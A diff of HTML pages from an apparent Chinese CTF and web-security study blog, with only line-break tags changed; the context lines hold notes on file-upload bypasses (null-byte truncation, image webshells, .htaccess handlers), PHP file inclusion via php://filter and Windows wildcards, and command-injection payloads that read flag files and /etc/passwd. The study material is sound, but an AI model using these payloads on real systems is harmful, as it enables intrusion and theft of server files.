 ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态域Session
-ID绑定后记录在服务器端。<br>
+ID绑定后记录在服务器端。<br />
 步骤3：客户端接收到从服务器端发来的Session
 ID后，会将其作为Cookie保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以Session
 ID也随之发送到服务器。服务器端可通过验证接收到的Session
@@ -1555,7 +1844,7 @@ ID识别用户和其认证状态。</p>
 ## 00截断上传
 通过抓包将文件上传路径<code>/upload/a.php.jpg</code>中的<code>.</code>换成<code>0x00</code>。即可让服务器认为文件已结束，保存为<code>a.php</code>文件。</p>
 <h2 id="图片马绕过">图片马绕过</h2>
-<p>输入<code>copy 1.jpg/b+a.php/a b.jpg</code>将a.php插入到1.jpg中形成图片马。/b是二进制打开，/a是ascii方式打开。<br>
+<p>输入<code>copy 1.jpg/b+a.php/a b.jpg</code>将a.php插入到1.jpg中形成图片马。/b是二进制打开，/a是ascii方式打开。<br />
 将图片马上传后，利用文件包含漏洞将该图片作为php文件解析，或者同时上传<code>.htaccess</code>文件
 <code>SetHandler application/x-httpd-php</code>将图片马作为php文件解析。</p>
 
@@ -1712,7 +2001,7 @@ value],有时候也可能在/var/lib/php5之类的，在此之前建议先读取
 在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了.
 解决这个问题的方法就是使用base64_encode进行编码 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo base64_encode(file_get_contents(&quot;solution.php&quot;));?&gt;</span><br></pre></td></tr></table></figure></p>
 <h2 id="phpfilter">5.3 php://filter</h2>
-<p>主要是利用了resource和vonvert，可以读到php的代码<br>
+<p>主要是利用了resource和vonvert，可以读到php的代码<br />
 ctf赛事中url参数值出现很像文件名的情况下，很有可能是文件包含，可利用filter协议读源码，通常flag在flag.php
 info.php phpinfo.php这几个文件中，优先考虑 &gt; php&gt;=5.0
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/convert.base64-encode/resource=test.txt</span><br><span class="line"></span><br><span class="line"># http</span><br><span class="line">?url=php://filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</span><br><span class="line"></span><br><span class="line"># resource 绕过</span><br><span class="line">$ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt</span><br></pre></td></tr></table></figure> 向磁盘写文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://fileter/write</span><br></pre></td></tr></table></figure>
@@ -1726,7 +2015,7 @@ php&gt;5.3.0 <figure class="highlight plaintext"><table><tr><td class="gutter"><
 <h2 id="通配符">6.1通配符&lt;&lt;</h2>
 <p>存在文件包含时，php在windows下包含文件，能使用<code>&lt;&lt;</code>当通配符用，使用<code>&lt;&lt;</code>符号相当于使用
 <code>*</code>号通配符。 * 样例 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-payload:<code>http://localhost/file.php?file=c:\windows\win&lt;&lt;</code>在没有base_dir限制的情况下，会读到c:.ini文件<br>
+payload:<code>http://localhost/file.php?file=c:\windows\win&lt;&lt;</code>在没有base_dir限制的情况下，会读到c:.ini文件<br />
 这个问题是由windows API FindFirstFile的一个特性 * 受影响函数
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include</span><br><span class="line">include_once</span><br><span class="line">require</span><br><span class="line">require_once</span><br><span class="line">fopen</span><br><span class="line">copy</span><br><span class="line">file_get_contents</span><br><span class="line">file_put_contents</span><br><span class="line">readfile</span><br><span class="line">mkdir</span><br><span class="line">move_uploaded_file</span><br></pre></td></tr></table></figure></p>
 <h1 id="ctfshow刷题记录">CTFshow刷题记录</h1>
@@ -1831,9 +2120,9 @@ payload:<code>http://localhost/file.php?file=c:\windows\win&lt;&lt;</code>在没
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br>
-命令注入产生的原因：<br>
-1. web网站没有对用户提交的参数进行有效的检测过滤。<br>
+          <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br />
+命令注入产生的原因：<br />
+1. web网站没有对用户提交的参数进行有效的检测过滤。<br />
 2. 操作系统允许一条语句执行多条命令（连接符和管道符）</p>
 <p>windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性|
 |ipconfig|查看当前ip地址| |netstat|查看网络端口及连接情况| |net
@@ -1849,8 +2138,8 @@ localgroup|查看、增加、删除当前系统用户组|
 |userdel|删除用户| |passwd|修改用户密码|</p>
 <table>
 <colgroup>
-<col style="width: 72%">
-<col style="width: 27%">
+<col style="width: 72%" />
+<col style="width: 27%" />
 </colgroup>
 <thead>
 <tr class="header">
@@ -1878,7 +2167,7 @@ localgroup|查看、增加、删除当前系统用户组|
 </tbody>
 </table>
 <h2 id="section">------</h2>
-<hr>
+<hr />
 <p>PHP最后一条语句可以没有分号。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = system(&quot;cp flag.php 1.txt&quot;);</span><br></pre></td></tr></table></figure>
 反引号`和system函数作用相同 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = `cp flag.php 1.txt`</span><br></pre></td></tr></table></figure> 嵌套执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;);</span><br></pre></td></tr></table></figure>
 tac倒序输出文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = include%0a$_GET[1];&amp;1=/etc/passwd</span><br><span class="line"></span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure> 语言结构（不需要使用括号）
@@ -1888,17 +2177,17 @@ echo print isset unset include require</p>
 <p>phpinfo()的返回值是1</p>
 </blockquote>
 <blockquote>
-<p>print_r(get_defined_vars());<br>
-输出当前所有变量<br>
-array_pop(next(get_defined_vars()));<br>
-弹出数组的值<br>
+<p>print_r(get_defined_vars());<br />
+输出当前所有变量<br />
+array_pop(next(get_defined_vars()));<br />
+弹出数组的值<br />
 eval()即可执行</p>
 </blockquote>
 <blockquote>
-<p>/&gt;dev/null 2&gt;&amp;1<br>
-无回显，可用双写绕过<br>
-<code>?c=ls;ls</code><br>
-第一个命令正常输出<br>
+<p>/&gt;dev/null 2&gt;&amp;1<br />
+无回显，可用双写绕过<br />
+<code>?c=ls;ls</code><br />
+第一个命令正常输出<br />
 <code>&amp;&amp;</code></p>
 </blockquote>
 <blockquote>
@@ -1913,11 +2202,11 @@ eval()即可执行</p>
 <blockquote>
 <p>构造数字</p>
 </blockquote>
-<p>文件读取<br>
+<p>文件读取<br />
 * file_get_contents * highlight_file * show_source</p>
 <p>包含文件后
 <code>var_dump(get_defined_vars())</code>或<code>echo $flag</code></p>
-<p>查看目录<br>
+<p>查看目录<br />
 <code>print_r(scandir('.'));</code></p>
 <p>curl <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;file://var/www/html/flag.php&quot;;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();</span><br><span class="line"> </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line"> </span><br><span class="line">curl_close($ch);</span><br><span class="line"> </span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 
